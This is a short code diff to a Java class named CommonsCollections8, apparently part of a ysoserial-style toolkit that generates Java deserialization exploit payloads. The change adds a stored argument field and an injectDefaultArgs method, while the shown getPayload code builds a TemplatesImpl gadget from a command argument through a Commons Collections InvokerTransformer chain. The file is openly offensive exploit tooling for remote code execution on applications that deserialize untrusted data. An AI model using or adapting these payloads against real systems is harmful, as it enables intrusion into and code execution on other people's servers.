@@ -29,6 +29,8 @@ import org.apache.commons.collections4.functors.InvokerTransformer;
  */
 public class CommonsCollections8 implements Payload {
 
+    private String[] args;
+
     /**
      *
      * @param args
@@ -40,6 +42,8 @@ public class CommonsCollections8 implements Payload {
      */
     @Override
     public Object getPayload(String[] args) throws Exception {
+        if (this.args != null)
+            args = this.args;
         Object templates = Gadgets.createTemplatesImpl(args[0]);
 
         // setup harmless chain
@@ -57,4 +61,10 @@ public class CommonsCollections8 implements Payload {
 
         return tree;
     }
+
+    @Override
+    public void injectDefaultArgs(String[] args) {
+        this.args = args;
+    }
+
 }
